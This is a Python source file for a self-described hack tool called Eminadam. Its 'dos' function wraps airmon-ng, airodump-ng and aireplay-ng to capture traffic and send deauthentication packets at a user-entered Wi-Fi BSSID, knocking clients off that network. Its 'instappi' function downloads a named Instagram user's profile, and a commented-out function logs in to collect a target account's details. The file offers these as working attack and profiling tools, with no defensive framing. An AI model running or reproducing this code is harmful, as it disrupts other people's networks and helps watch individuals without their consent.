#########################
#__ .     ¨   ~     . ¨ #
#  \__  By Vahema    ___#
#     \     ¨  .    /   #
#########################

import random, time as t, os, instaloader as il
from colorama import Fore

fblue = Fore.BLUE
fred = Fore.RED
fyellow = Fore.YELLOW
fgreen = Fore.GREEN
fwhite = Fore.WHITE

ver = "1.9.2"

def banner():
	os.system("clear")
	t.sleep(0.25)
	print(f"""\n\n

{fblue}  ▓█████{fred}  ███▄ ▄███▓ ██▓ ███▄    █ {fblue} ▄▄▄      ▓█████▄  ▄▄▄     {fred}  ███▄ ▄███▓
{fblue}  ▓█   ▀{fred} ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ {fblue}▒████▄    ▒██▀ ██▌▒████▄   {fred} ▓██▒▀█▀ ██▒
{fblue}  ▒███  {fred} ▓██    ▓██░▒██▒▓██  ▀█ ██▒{fblue}▒██  ▀█▄  ░██   █▌▒██  ▀█▄ {fred} ▓██    ▓██░
{fblue}  ▒▓█  ▄{fred} ▒██    ▒██ ░██░▓██▒  ▐▌██▒{fblue}░██▄▄▄▄██ ░▓█▄   ▌░██▄▄▄▄██{fred} ▒██    ▒██ 
{fblue}  ░▒████{fred}▒▒██▒   ░██▒░██░▒██░   ▓██░{fblue} ▓█   ▓██▒░▒████▓  ▓█   ▓██▒{fred}▒██▒   ░██▒
{fblue}  ░░ ▒░ {fred}░░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ {fblue} ▒▒   ▓▒█░ ▒▒▓  ▒  ▒▒   ▓▒█░░{fred} ▒░   ░  ░
{fblue}   ░ ░  {fred}░░  ░      ░ ▒ ░░ ░░   ░ ▒░{fblue}  ▒   ▒▒ ░ ░ ▒  ▒   ▒   ▒▒ ░░{fred}  ░      ░
{fblue}     ░  {fred} ░      ░    ▒ ░   ░   ░ ░ {fblue}  ░   ▒    ░ ░  ░   ░   ▒   ░{fred}      ░   
{fblue}     ░  {fred}░       ░    ░           ░ {fblue}      ░  ░   ░          ░  ░ {fred}      ░   
{fblue}        {fred}                           {fblue}           ░   {fgreen}v{ver}{fblue} BY{fred} VAHEMA{fwhite}          
\n\n""")

def help():
	print(f"""
{fyellow} ### HELP ###
{fgreen} Eminadam is a hack tool made by Vahema
 Don't forget to {fred}update{fgreen} the tool!

{fyellow} # Commands {fgreen}
 help       : Get help
 exit       : Exit from the tool
 restart    : Restart the tool
 update     : Update the tool
 clear      : Clear the shell
 echo       : Print anything
 dos        : Dos attack (mac)
 instappi   : Get ig status
{fwhite}
""")

def restart():
	os.system("clear")
	os.system("python3 eminadam.py")

def update():
	os.system("clear")
	os.system("sudo apt install python3 aircrack-ng xterm && pip install colorama instaloader")
	os.system("python3 eminadam.py")

def clear():
	os.system("clear")
	banner()

def dos():
	def dos_menu():
		print(f"""
{fyellow}### DOS MENU ###

{fyellow}[00]{fgreen} Cancel
{fyellow}[01]{fgreen} Attack {fwhite}
				 """)

	dos_run = True
	while dos_run:
		dos_menu()
		ui = input("DOS> ")

		if ui == "" or int(ui) == 0:
			dos_run = False

		elif int(ui) == 1:
			ui = input(f"Your connection will be {fred}lost{fwhite}\nWill you continue [y/n] : ")
			if ui == "y" or ui == "Y":
				pass
			else:
				print("")
				dos_run = False

			print(f"{fred}WRITE BSSID HERE, THEN CLOSE THE TERMINAL{fwhite}")
			os.system("sudo xterm -e airmon-ng start wlan0")
			os.system("sudo xterm -e airodump-ng wlan0mon")

			bssid = input("Bssid : ")
			deauth = input("Deauth : ")
			channel = input("Channel : ")
			print(f"\n{fred}CLOSE THE TERMINAL{fwhite}\n")
			os.system(f"sudo xterm -e airodump-ng --bssid {bssid} --channel {channel} -w ./data/dos/eminadam wlan0mon")
			os.system(f"sudo xterm -e aireplay-ng --deauth {deauth} -a {bssid} wlan0mon")
			os.system("sudo airmon-ng stop wlan0mon")

		else:
			dos_run = False

def instappi():
	print(f"""
{fyellow}### INSTAPPI MENU ###
{fgreen}Write user nick {fred}clearly{fgreen}
   {fwhite}""")

	ig = il.Instaloader()
	dp = input("User nick : ")

	os.system("clear")

	ig.download_profile(dp)

	t.sleep(1.25)
	os.system("clear")
	banner()
	print(f"\n{fyellow}[+]{fwhite} Profile downloaded succesfully\n")
 
"""
def instappi2():
	print("insta menu")
	ils = il.Instaloader()
	u_nick = input("IGLogin(Nick)> ")
	u_pass = input("IGLogin(Pass)> ")
	print("Logging in")
	ils.login(u_nick, u_pass)
	print("Logged in")

	target_account = input("target : ")
	profile = il.Profile.from_username(instagram.context, target_account)
	print("Posts : ", profile.mediacount)
	print("Following : ", profile.followees)
	print("Followers : ", profile.followers)
	print("Bio : ", profile.biography)
	print("Web Site : ", profile.external_url)
"""